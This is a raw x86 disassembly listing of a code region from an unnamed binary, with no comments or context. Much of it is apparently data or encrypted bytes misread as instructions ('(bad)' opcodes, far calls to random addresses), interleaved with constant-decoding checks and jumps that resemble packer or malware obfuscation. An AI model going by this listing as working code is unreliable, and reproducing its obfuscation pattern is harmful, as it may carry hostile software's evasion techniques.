  40a79e:	jl     0x40a818
  40a7a0:	push   ebp
  40a7a1:	fwait
  40a7a2:	add    eax,0x32729d
  40a7a7:	leave  
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43049e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43049e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43049e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43049e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43049e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ebd0
  40a7f1:	cmp    DWORD PTR ds:0x43049e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43049e
  40a803:	inc    eax
  40a804:	mov    ds:0x43049e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x4304d2
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x4304d6
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a890
  40a840:	jmp    0xeb569924
  40a845:	jle    0x40a8c5
  40a847:	pop    esp
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a7cc
  40a84c:	pop    es
  40a84d:	sub    eax,0xe9bb97ad
  40a852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a853:	push   es
  40a854:	or     dh,bl
  40a856:	mov    edi,0xa30bf8e7
  40a85b:	stos   BYTE PTR es:[edi],al
  40a85c:	xor    edx,DWORD PTR [ebx+0x74]
  40a85f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a860:	pop    ds
  40a861:	push   ecx
  40a862:	fdivr  st(7),st
  40a864:	sbb    al,0xfc
  40a866:	aas    
  40a867:	mov    WORD PTR [ecx-0x18],ds
  40a86a:	js     0x40a80f
  40a86c:	arpl   WORD PTR [esi+0x64],bx
  40a86f:	jmp    0x872c98f4
  40a874:	ficomp DWORD PTR [ebp+0x6a1be99]
  40a87a:	js     0x40a858
  40a87c:	jnp    0x40a892
  40a87e:	mov    esp,0x9c1894f8
  40a883:	clc    
  40a884:	sub    cl,BYTE PTR [ecx]
  40a886:	ret    
  40a887:	jg     0x40a89f
  40a889:	sti    
  40a88a:	add    DWORD PTR [ebp-0x2dcfaedc],esi
  40a890:	imul   eax,eax,0xffffff8e
  40a893:	xor    ebx,DWORD PTR [ebx+0x34dcb49c]
  40a899:	in     eax,0x6
  40a89b:	daa    
  40a89c:	int    0x1d
  40a89e:	add    al,0xd1
  40a8a0:	mov    eax,0xc2865bce
  40a8a5:	dec    eax
  40a8a6:	sub    al,0x85
  40a8a8:	sbb    DWORD PTR [edi+0x76f6d7f2],ebp
  40a8ae:	shl    bh,1
  40a8b0:	icebp  
  40a8b1:	call   0xdf66:0x10dd1a30
  40a8b8:	pop    ebp
  40a8b9:	test   BYTE PTR [esi-0x23ae6322],bh
  40a8bf:	push   ebp
  40a8c0:	(bad)  
  40a8c1:	push   edi
  40a8c2:	popa   
  40a8c3:	das    
  40a8c4:	ins    BYTE PTR es:[edi],dx
  40a8c5:	test   eax,esi
  40a8c7:	jnp    0x40a8ff
  40a8c9:	jbe    0x40a8e4
  40a8cb:	data16 clc 
  40a8cd:	scas   eax,DWORD PTR es:[edi]
  40a8ce:	xchg   ebp,eax
  40a8cf:	(bad)  
  40a8d0:	pop    ss
  40a8d1:	(bad)  
  40a8d2:	cwde   
  40a8d3:	cmc    
  40a8d4:	and    ebx,DWORD PTR [esi]
  40a8d6:	add    BYTE PTR [esi],ah
  40a8d8:	ins    DWORD PTR es:[edi],dx
  40a8d9:	hlt    
  40a8da:	jmp    0x40a877
  40a8dc:	sar    BYTE PTR [edi],0xa6
  40a8df:	sahf   
  40a8e0:	les    ecx,FWORD PTR [eax+esi*4+0x41c6b032]
  40a8e7:	loopne 0x40a883
  40a8e9:	mov    eax,ds:0xe56e3bba
  40a8ee:	pop    esi
  40a8ef:	stos   DWORD PTR es:[edi],eax
  40a8f0:	jmp    0x1471:0x2e46e185
  40a8f7:	mov    edi,DWORD PTR [edi+0x3d189cc5]
  40a8fd:	inc    esp
  40a8fe:	ficom  WORD PTR [eax]
  40a900:	pop    es
  40a901:	aaa    
  40a902:	mov    ebp,0x9584dae9
  40a907:	aad    0x3f
  40a909:	push   eax
  40a90a:	cmc    
  40a90b:	scas   eax,DWORD PTR es:[edi]
  40a90c:	xchg   ecx,eax
  40a90d:	hlt    
  40a90e:	inc    edx
  40a90f:	mov    ds:0x29d3feea,eax
  40a914:	icebp  
  40a915:	call   0xd7c2:0x3756c994
  40a91c:	xchg   esi,eax
  40a91d:	std    
  40a91e:	inc    ebx
  40a91f:	pop    ebx
  40a920:	nop
  40a921:	ja     0x40a8b7
  40a923:	or     BYTE PTR [ecx-0x5a],bl
  40a926:	test   al,0x8
  40a928:	outs   dx,BYTE PTR ds:[esi]
  40a929:	mov    ebp,0xf70ea9d2
  40a92e:	fbstp  TBYTE PTR [eax]
  40a930:	(bad)  [eax-0x30]
  40a933:	stos   BYTE PTR es:[edi],al
  40a934:	mov    ch,0x63
  40a936:	mov    ah,0xd2
  40a938:	fisttp WORD PTR [ebp+0x737e6321]
  40a93e:	(bad)  
  40a93f:	mov    eax,0x72f8416f
  40a944:	lahf   
  40a945:	or     al,0x66
  40a947:	xor    BYTE PTR [eax-0x33],bh
  40a94a:	pop    edx
  40a94b:	icebp  
  40a94c:	inc    ecx
  40a94d:	xchg   esi,eax
  40a94e:	and    DWORD PTR [eax-0x6bd712b],ebx
  40a954:	sub    esi,DWORD PTR [ebx]
  40a956:	fsubrp st(7),st
  40a958:	(bad)  
  40a95a:	je     0x40a9ac
  40a95c:	(bad)  
  40a95d:	jbe    0x40a904
  40a95f:	adc    edi,DWORD PTR [ebx+0x6a4e3e34]
  40a965:	jnp    0x40a971
  40a967:	ins    DWORD PTR es:[edi],dx
  40a968:	jmp    0xf94abfc3
  40a96d:	imul   esp,DWORD PTR [edi+0x3c],0x21
  40a971:	inc    esp
  40a972:	sbb    al,0xb0
  40a974:	aam    0xad
  40a976:	imul   esi,DWORD PTR [ebp-0x3c1445cb],0xb01cb07b
  40a980:	pop    ebx
  40a981:	mov    edi,0xd1d700c7
  40a986:	mov    WORD PTR [esi-0x6d625ffc],cs
  40a98c:	jae    0x40a9f4
  40a98e:	cmp    ah,ah
  40a990:	jp     0x40a9c7
  40a992:	mov    edx,0x18f8b7e7
  40a997:	mov    edi,0xace0956c
  40a99c:	push   es
  40a99d:	stos   DWORD PTR es:[edi],eax
  40a99e:	fnstsw WORD PTR [edx+0x5b482bca]
  40a9a4:	and    eax,0x638ae673
  40a9a9:	and    eax,0x53405857
  40a9ae:	add    DWORD PTR [bp+di+0x3c66],ebp
  40a9b3:	jg     0x40a9a6
  40a9b5:	or     eax,0x4624a385
  40a9ba:	lods   al,BYTE PTR ds:[esi]
  40a9bb:	mov    esp,0xac94c357
  40a9c0:	in     al,0x7c
  40a9c2:	fwait
  40a9c3:	add    DWORD PTR [esp+edi*8],eax
  40a9c6:	mov    bh,0xc2
  40a9c8:	lock nop
  40a9ca:	jo     0x40a96a
  40a9cc:	fdivr  DWORD PTR [edi-0x1f5e1c0e]
  40a9d2:	test   BYTE PTR [edi],dl
  40a9d4:	imul   ebx,DWORD PTR [edx-0x6e],0xed974dad
  40a9db:	rol    DWORD PTR [eax],0x49
  40a9de:	dec    edx
  40a9df:	lahf   
  40a9e0:	nop
  40a9e1:	mov    DWORD PTR [esi],esp
  40a9e3:	les    esi,FWORD PTR [esi]
  40a9e5:	adc    dl,BYTE PTR [ecx]
  40a9e7:	popa   
  40a9e8:	jnp    0x40a983
  40a9ea:	leave  
  40a9eb:	cmc    
  40a9ec:	mov    ebp,0x53248c24
  40a9f1:	push   edi
  40a9f2:	js     0x40a9ca
  40a9f4:	lods   al,BYTE PTR ds:[esi]
  40a9f5:	xchg   ebx,eax
  40a9f6:	shl    bh,1
  40a9f8:	pop    es
  40a9f9:	retf   
  40a9fa:	jne    0x40a998
  40a9fc:	or     edx,ecx
  40a9fe:	sub    al,0xd9
  40aa00:	push   cs
  40aa01:	cmp    DWORD PTR [ebx],esi
  40aa03:	xchg   ebx,eax
  40aa04:	(bad)  
  40aa05:	lea    ebx,[esi-0x30]
  40aa08:	dec    edi
  40aa09:	shr    ch,1
  40aa0b:	lods   al,BYTE PTR ds:[esi]
  40aa0c:	add    BYTE PTR [esi+0x68a0c008],ch
  40aa12:	and    eax,0x54af004a
  40aa17:	icebp  
  40aa18:	push   0x16
  40aa1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa1b:	xor    al,0x17
  40aa1d:	test   DWORD PTR [ecx+0x2fe43467],eax
  40aa23:	cmp    ebp,DWORD PTR [ecx+0x52fc0496]
  40aa29:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40aa30:	or     edx,ecx
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e762,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x43055a,0x42e762
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e75a,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x430556,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	test   DWORD PTR [eax],ecx
  40aa9f:	adc    DWORD PTR [edi],eax
  40aaa1:	jae    0x40aa90
  40aaa3:	jle    0x40ab23
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aac1
  40aaaa:	jmp    0x4992:0xceed2d71
  40aab1:	shufps xmm6,XMMWORD PTR [edx],0x7a
  40aab5:	xor    al,al
  40aab7:	jae    0x40aa89
  40aab9:	jg     0x40aa42
  40aabb:	jns    0x40aa4b
  40aabd:	call   ecx
  40aabf:	fs test eax,0x53f33cc7
  40aac5:	pop    ds
  40aac6:	pop    ebp
  40aac7:	add    edi,DWORD PTR [edx+edx*1-0x35]
  40aacb:	add    esi,esi
  40aacd:	add    BYTE PTR [bx+di-0x56],bl
  40aad1:	mov    eax,0x952b4744
  40aad6:	jne    0x40aa58
  40aad8:	jl     0x40ab50
  40aada:	loopne 0x40ab17
  40aadc:	daa    
  40aadd:	cmc    
  40aade:	ret    0x841a
  40aae1:	push   esp
  40aae2:	test   al,0x9
  40aae4:	mov    dl,BYTE PTR [edx+0x7a1244ea]
  40aaea:	xchg   edx,eax
  40aaeb:	stc    
  40aaec:	mov    ds:0x5024ed43,al
  40aaf1:	push   esp
  40aaf2:	xchg   ebx,eax
  40aaf3:	lods   al,BYTE PTR ds:[esi]
  40aaf4:	adc    al,0x26
  40aaf6:	jae    0x40ab60
  40aaf8:	add    ch,BYTE PTR [esi+0x7a]
  40aafb:	adc    esi,DWORD PTR [ebx+0x2bf7d569]
  40ab01:	dec    ebp
  40ab02:	jmp    0x34403edf
  40ab07:	cmc    
  40ab08:	pushf  
  40ab09:	jne    0x40aae6
  40ab0b:	push   cs
  40ab0c:	es repnz call 0xc226:0xf870a2b3
  40ab15:	out    dx,al
  40ab16:	outs   dx,BYTE PTR ds:[esi]
  40ab17:	int    0x3e
  40ab19:	push   eax
  40ab1a:	pop    ebx
  40ab1b:	gs pop ebx
  40ab1d:	xor    eax,0xc2f9497d
  40ab22:	cs add edx,eax
  40ab25:	mov    bh,0x90
  40ab27:	adc    eax,0x3b124de3
  40ab2c:	ins    DWORD PTR es:[edi],dx
  40ab2d:	bound  edx,QWORD PTR [ecx+0x6f8d18fc]
  40ab33:	add    ecx,edi
  40ab35:	int    0xb4
  40ab37:	sbb    eax,0xb2a82196
  40ab3c:	jne    0x40ab42
  40ab3e:	fdivr  QWORD PTR [ecx-0x29]
  40ab41:	pushf  
  40ab42:	pop    ecx
  40ab43:	xchg   ebp,eax
  40ab44:	leave  
  40ab45:	push   edi
  40ab46:	(bad)  
  40ab47:	push   0xfffffffc
  40ab49:	ret    0xee3f
  40ab4c:	cs pop ss
  40ab4e:	into   
  40ab4f:	dec    ebp
  40ab50:	mov    cl,0x28
  40ab52:	and    esp,DWORD PTR [ecx]
  40ab54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab55:	sbb    bh,BYTE PTR [ecx]
  40ab57:	push   esi
  40ab58:	jae    0x40aaf6
  40ab5a:	xor    al,0x83
  40ab5c:	(bad)  
  40ab5d:	fcom   DWORD PTR [eax+0x49fe82bd]
  40ab63:	sar    BYTE PTR ds:0x729eeb22,cl
  40ab69:	push   ebp
  40ab6a:	push   ds
  40ab6b:	(bad)  
  40ab6c:	(bad)  
  40ab6d:	mov    dh,BYTE PTR [ecx]
  40ab6f:	mov    dh,0x81
  40ab71:	into   
  40ab72:	dec    esi
  40ab73:	js     0x40aba9
  40ab75:	inc    ecx
  40ab76:	mov    DWORD PTR [ecx-0x3f],edx
  40ab79:	push   ecx
  40ab7a:	ins    DWORD PTR es:[edi],dx
  40ab7b:	shr    DWORD PTR [edi],0x56
  40ab7e:	add    DWORD PTR [ebx],esp
  40ab80:	pushf  
  40ab81:	iret   
  40ab82:	loopne 0x40ab2d
  40ab84:	out    0x92,al
  40ab86:	inc    ebp
  40ab87:	sbb    al,0x21
  40ab89:	jbe    0x40ab9f
  40ab8b:	mov    al,ds:0xdab3c638
  40ab90:	sti    
  40ab91:	les    ecx,FWORD PTR [ecx+0x1a5c7451]
  40ab97:	push   0xffffff8b
  40ab99:	data16 adc BYTE PTR [ecx-0x94efafa],bh
  40aba0:	mov    al,bh
  40aba2:	out    0xa2,al
  40aba4:	rol    BYTE PTR [edx],cl
  40aba6:	pusha  
  40aba7:	dec    ebx
  40aba8:	arpl   WORD PTR [edi-0x9cef0f4],dx
  40abae:	jmp    0x9a6d4e4d
  40abb3:	arpl   WORD PTR [eax+0x32b8f689],sp
  40abb9:	push   0x130b302
  40abbe:	fmul   st,st(0)
  40abc0:	jecxz  0x40abd1
  40abc2:	js     0x40ac0a
  40abc4:	cmp    al,0x25
  40abc6:	test   al,0xc5
  40abc8:	push   ss
  40abc9:	cdq    
  40abca:	push   edi
  40abcb:	add    ecx,esi
  40abcd:	sbb    eax,esp
  40abcf:	repz arpl WORD PTR [ebp-0xe],ax
  40abd3:	test   al,0x83
  40abd5:	and    ah,ch
  40abd7:	cmovb  esp,DWORD PTR [eax-0x2cea0b31]
  40abde:	fadd   st(3),st
  40abe0:	cmp    al,0x15
  40abe2:	xchg   al,bh
  40abe4:	imul   ebp,DWORD PTR [ebp-0x35],0xffffff88
  40abe8:	mov    es,ebp
  40abea:	mov    BYTE PTR [esi+0x51],bh
  40abed:	adc    BYTE PTR [eax+0x6dbd3462],ah
  40abf3:	add    DWORD PTR [edi+0x3fe4db60],0x9c8c1b7
  40abfd:	cmp    eax,0x95820136
  40ac02:	hlt    
  40ac03:	test   DWORD PTR [eax+0x51c723ec],0xbe02ac10
  40ac0d:	jnp    0x40ac6e
  40ac0f:	jecxz  0x40abaa
  40ac11:	push   0xffffffe5
  40ac13:	fidiv  WORD PTR [eax-0x4c1636b3]
  40ac19:	jnp    0x40ac82
  40ac1b:	sbb    DWORD PTR [ebp+0x9c0bde1],esi
  40ac21:	es popa 
  40ac23:	not    DWORD PTR [ecx]
  40ac25:	in     eax,dx
  40ac26:	popf   
  40ac27:	je     0x40ac30
  40ac29:	mov    edi,esp
  40ac2b:	(bad)  
  40ac2c:	enter  0xea2e,0x19
  40ac30:	pushf  
  40ac31:	aaa    
  40ac32:	add    al,0x64
  40ac34:	std    
  40ac35:	and    al,dh
  40ac37:	popfw  
  40ac39:	inc    esp
  40ac3a:	aad    0x3d
  40ac3c:	(bad)  
  40ac3d:	mov    dl,0xee
  40ac3f:	xchg   ecx,eax
  40ac40:	dec    esp
  40ac41:	punpckhbw mm5,QWORD PTR [edx+0xf6957bd]
  40ac48:	fdiv   DWORD PTR [ebp+0x7b0d805f]
  40ac4e:	dec    esp
  40ac4f:	push   ebx
  40ac50:	hlt    
  40ac51:	fwait
  40ac52:	les    esp,FWORD PTR [ebp+0x8]
  40ac55:	aam    0x2
  40ac57:	push   cs
  40ac58:	adc    DWORD PTR [esi+ecx*8+0x6],edx
  40ac5c:	cli    
  40ac5d:	es popa 
  40ac5f:	push   ebp
  40ac60:	and    BYTE PTR [eax],ch
  40ac62:	dec    eax
  40ac63:	or     al,0xd
  40ac65:	lsl    ecx,ax
  40ac68:	mov    bl,0xc5
  40ac6a:	lods   al,BYTE PTR ds:[esi]
  40ac6b:	js     0x40ac24
  40ac6d:	loope  0x40ac1e
  40ac6f:	mov    cl,BYTE PTR [esi]
  40ac71:	sbb    esp,DWORD PTR [ecx]
  40ac73:	pop    edi
  40ac74:	scas   al,BYTE PTR es:[edi]
  40ac75:	arpl   bx,bx
  40ac77:	dec    edx
  40ac78:	popa   
  40ac79:	aad    0xd5
  40ac7b:	push   ds
  40ac7c:	xchg   ebp,eax
  40ac7d:	arpl   WORD PTR [ecx],si
  40ac7f:	enter  0x8a5d,0xd3
  40ac83:	retf   
  40ac84:	cmp    al,0x50
  40ac86:	(bad)  
  40ac87:	xor    eax,edx
  40ac89:	xor    esi,edx
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0xaa051202
  40aca1:	pop    eax
  40aca2:	push   ecx
  40aca3:	out    dx,al
  40aca4:	jle    0x40ad24
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40ac84
  40acab:	fidiv  DWORD PTR [ebx]
  40acad:	sbb    DWORD PTR [edx+0x62615802],0xfd35ee37
  40acb7:	jmp    0x361e03ed
  40acbc:	clc    
  40acbd:	mov    dl,0xb7
  40acbf:	daa    
  40acc0:	adc    al,0xb
  40acc2:	dec    esi
  40acc3:	and    edi,DWORD PTR [ecx+eax*4+0x7b]
  40acc7:	shl    DWORD PTR [eax+0xf],cl
  40acca:	and    DWORD PTR [esi+ecx*8+0x21],edi
  40acce:	cmp    bh,bl
  40acd0:	and    ch,BYTE PTR [eax+0x48f78f4b]
  40acd6:	fdivr  st,st(2)
  40acd8:	pop    eax
  40acd9:	cs out 0x5c,al
  40acdc:	test   eax,0xaf99768d
  40ace1:	adc    eax,0xe4302d0b
  40ace6:	mov    dl,0x78
  40ace8:	inc    ecx
  40ace9:	cdq    
  40acea:	mov    bh,0x8a
  40acec:	or     BYTE PTR [edi],dh
  40acee:	aam    0x59
  40acf0:	jp     0x40ad1c
  40acf2:	cdq    
  40acf3:	aaa    
  40acf4:	dec    esi
  40acf5:	xor    BYTE PTR ds:[eax],dl
  40acf8:	push   ebx
  40acf9:	dec    ebx
  40acfa:	mov    dh,BYTE PTR [edi]
  40acfc:	pop    ecx
  40acfd:	mov    eax,ds:0xba00b512
  40ad02:	xor    ah,BYTE PTR [ebp+0x7b]
  40ad05:	mov    ebp,0x2576bc3d
  40ad0a:	out    dx,al
  40ad0b:	and    ecx,DWORD PTR [esi]
  40ad0d:	test   al,0x4d
  40ad0f:	adc    cl,bh
  40ad11:	mov    al,0xf5
  40ad13:	xchg   edx,eax
  40ad14:	push   ss
  40ad15:	mov    WORD PTR [edx-0x50],es
  40ad18:	and    DWORD PTR [ebx+0x34],edi
  40ad1b:	rol    DWORD PTR [edi+0x58],1
  40ad1e:	ret    0xcd5c
  40ad21:	push   es
  40ad22:	inc    edx
  40ad23:	xchg   ecx,eax
  40ad24:	and    DWORD PTR [edi+edi*8-0x69],edi
  40ad28:	(bad)  
  40ad2a:	or     al,0x5a
  40ad2c:	jo     0x40ad6d
  40ad2e:	pop    eax
  40ad2f:	xchg   ebx,eax
  40ad30:	xchg   ebp,eax
  40ad31:	div    BYTE PTR [eax-0x8]
  40ad34:	mov    dl,0x52
  40ad36:	mov    edi,0x53e80640
  40ad3b:	mov    eax,ds:0x397ce589
  40ad40:	out    0x38,al
  40ad42:	xor    BYTE PTR [eax],dh
  40ad44:	inc    esi
  40ad45:	sbb    dh,BYTE PTR [ebx+edi*8]
  40ad48:	rol    ecx,0x93
  40ad4b:	inc    esp
  40ad4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad4d:	mov    bh,0x3b
  40ad50:	cmc    
  40ad51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad52:	(bad)  
  40ad54:	ds fsubp st(6),st
  40ad57:	mov    bl,0x5a
  40ad59:	iret   
  40ad5a:	gs and al,0x1e
  40ad5d:	jge    0x40ad90
  40ad5f:	repnz xor dh,dh
  40ad62:	add    al,0x41
  40ad64:	hlt    
  40ad65:	xchg   BYTE PTR [ebx],bh
  40ad67:	les    edx,FWORD PTR ds:0xc2cf027f
  40ad6d:	es inc ecx
  40ad6f:	lahf   
  40ad70:	jne    0x40adc0
  40ad72:	jae    0x40ada8
  40ad74:	xchg   esi,eax
  40ad75:	pushf  
  40ad76:	out    0x10,al
  40ad78:	pop    ebp
  40ad79:	aas    
  40ad7a:	mov    ds:0xcb77bc76,al
  40ad7f:	mov    al,ds:0x29700761
  40ad84:	jmp    0x7e37793e
  40ad89:	sub    cl,BYTE PTR [ecx-0x78454c68]
  40ad8f:	xor    eax,DWORD PTR [esi+0x4029cd54]
  40ad95:	das    
  40ad96:	test   al,0x77
  40ad98:	stos   DWORD PTR es:[edi],eax
  40ad99:	aad    0x92
  40ad9b:	jl     0x40adf4
  40ad9d:	xlat   BYTE PTR ds:[ebx]
  40ad9e:	aas    
  40ad9f:	outs   dx,BYTE PTR ds:[esi]
  40ada0:	test   DWORD PTR [edx-0x63],0x7d5ee4b
  40ada7:	sti    
  40ada8:	bound  edx,QWORD PTR [ebp-0x7e]
  40adab:	bound  edi,QWORD PTR [ebx+0x2fc27606]
  40adb1:	push   ss
  40adb2:	je     0x40ad71
  40adb4:	xchg   ah,al
  40adb6:	pop    ebx
  40adb7:	xor    BYTE PTR [ebp+0x2b],bl
  40adba:	sbb    BYTE PTR [eax+0x55988b9a],al
  40adc0:	daa    
  40adc1:	out    dx,eax
  40adc2:	jne    0x40ae37
  40adc4:	aaa    
  40adc5:	dec    ecx
  40adc6:	ds jbe 0x40ae43
  40adc9:	cmp    eax,0x10eabccc
  40adce:	push   ds
  40adcf:	test   DWORD PTR [ebx-0x772b2363],0x2193f96e
  40add9:	lock sahf 
  40addb:	ds repnz popa 
  40adde:	inc    ebp
  40addf:	out    dx,al
  40ade0:	jmp    0x259c796e
  40ade5:	pop    edx
  40ade6:	xchg   edi,eax
  40ade7:	fwait
  40ade8:	out    0x96,eax
  40adea:	pop    ebx
  40adeb:	mov    ebx,0x296f3801
  40adf0:	cwde   
  40adf1:	cmp    eax,edi
  40adf3:	inc    ebx
  40adf4:	int3   
  40adf5:	and    ecx,DWORD PTR [esi+0x7d]
  40adf8:	jp     0x40ae53
  40adfa:	jg     0x40ae54
  40adfc:	je     0x40ae06
  40adfe:	jbe    0x40ad8d
  40ae00:	mov    edi,0xc28ac910
  40ae05:	je     0x40ae0d
  40ae07:	cmp    bh,BYTE PTR [edx]
  40ae09:	fidiv  DWORD PTR [ecx]
  40ae0b:	push   0xffffffac
  40ae0d:	and    BYTE PTR [edx-0x3897d9bc],0x5f
  40ae14:	stos   BYTE PTR es:[edi],al
  40ae15:	jns    0x40ada7
  40ae17:	adc    al,0x8a
  40ae19:	or     dl,BYTE PTR [edi+0x540b678e]
  40ae1f:	test   al,0x2b
  40ae21:	dec    ebx
  40ae22:	mov    ah,0x5b
  40ae24:	std    
  40ae25:	mov    eax,ds:0xc3ef2d18
  40ae2a:	leave  
  40ae2b:	popf   
  40ae2c:	lock cmp DWORD PTR fs:[esi],edx
  40ae30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae31:	repnz push 0xffffff82
  40ae34:	adc    al,0x73
  40ae36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae37:	mov    cl,0xa5
  40ae39:	scas   eax,DWORD PTR es:[edi]
  40ae3a:	div    esi
  40ae3c:	(bad)  
  40ae3d:	jg     0x37e835d1
  40ae43:	xor    eax,0x93af5219
  40ae48:	mov    bh,0x1e
  40ae4a:	push   edi
  40ae4b:	or     DWORD PTR [ebp-0x10],esp
  40ae4e:	pop    edi
  40ae4f:	sar    BYTE PTR ds:0xa47a595b,0x3e
  40ae56:	loop   0x40ae86
  40ae58:	pop    edi
  40ae59:	popf   
  40ae5a:	xchg   esi,eax
  40ae5b:	ret    
  40ae5c:	fs jnp 0x40ae49
  40ae5f:	inc    edi
  40ae60:	jne    0x40ae11
  40ae62:	call   DWORD PTR [ebp+0xc]
  40ae65:	scas   al,BYTE PTR es:[edi]
  40ae66:	lahf   
  40ae67:	and    DWORD PTR [esi-0x19d68494],ebx
  40ae6d:	lea    esi,[eax-0x23277ace]
  40ae73:	call   0xf63817cb
  40ae78:	fsqrt  
  40ae7a:	cmp    ebx,DWORD PTR ds:0x3053a4df
  40ae80:	mov    al,ds:0x9415fc56
  40ae85:	(bad)  
  40ae86:	cmp    DWORD PTR [edi-0x50f00efd],ebx
  40ae8c:	(bad)  
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock pop ecx
  40aeb3:	pop    ss
  40aeb4:	xor    al,BYTE PTR [edx]
  40aeb6:	mov    edi,0x5c7e7ee0
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40ae41
  40aebf:	sub    DWORD PTR [ebp+0x1e],esi
  40aec2:	xchg   DWORD PTR [edx+0x40c46825],ecx
  40aec8:	jae    0x40ae8a
  40aeca:	fsub   st,st(5)
  40aecc:	mov    edx,0x7b5d16ee
  40aed1:	push   0x586cc745
  40aed6:	retf   
  40aed7:	inc    ecx
  40aed8:	int3   
  40aed9:	wrmsr  
  40aedb:	and    al,0xd4
  40aedd:	cmp    al,0x9a
  40aedf:	inc    edx
  40aee0:	jno    0x40af0c
  40aee2:	pop    ds
  40aee3:	mov    BYTE PTR [eax+0x225fdf17],ah
  40aee9:	mov    ebx,ecx
  40aeeb:	jge    0x53a0a291
  40aef1:	dec    esp
  40aef2:	jmp    0x40aef1
  40aef4:	pop    es
  40aef5:	cwde   
  40aef6:	je     0x40af76
  40aef8:	pop    es
  40aef9:	sbb    eax,0xed501129
  40aefe:	dec    ebx
  40aeff:	stos   BYTE PTR es:[edi],al
  40af00:	jb     0x40af7a
  40af02:	lahf   
  40af03:	stos   BYTE PTR es:[edi],al
  40af04:	mov    edx,0x31163599
  40af09:	repz call 0xd368:0x3b94ee00
  40af11:	dec    edx
  40af12:	aad    0x73
  40af14:	out    dx,al
  40af15:	sbb    dh,bh
  40af17:	xchg   DWORD PTR [ecx+edi*4+0x143e12fa],edi
  40af1e:	cmp    DWORD PTR [ecx-0x3],esp
  40af21:	in     eax,dx
  40af22:	ret    0x297c
  40af25:	xchg   ecx,eax
  40af26:	xor    BYTE PTR [ecx+0x46],0x74
  40af2a:	fistp  WORD PTR [edx]
  40af2c:	jb     0x40aef9
  40af2e:	jbe    0x40afab
  40af30:	enter  0x3d36,0xab
  40af34:	dec    edi
  40af35:	jo     0x40af65
  40af37:	sbb    ch,BYTE PTR [ebx-0x22]
  40af3a:	sbb    BYTE PTR cs:[ebp+0xa013f00],bh
  40af41:	in     al,0x0
  40af43:	cmp    DWORD PTR [ebp+0xf],ebx
  40af46:	add    eax,0xe3b6fa49
  40af4b:	mov    al,ds:0x3d88731e
  40af50:	xor    al,0x92
  40af52:	mov    esp,es
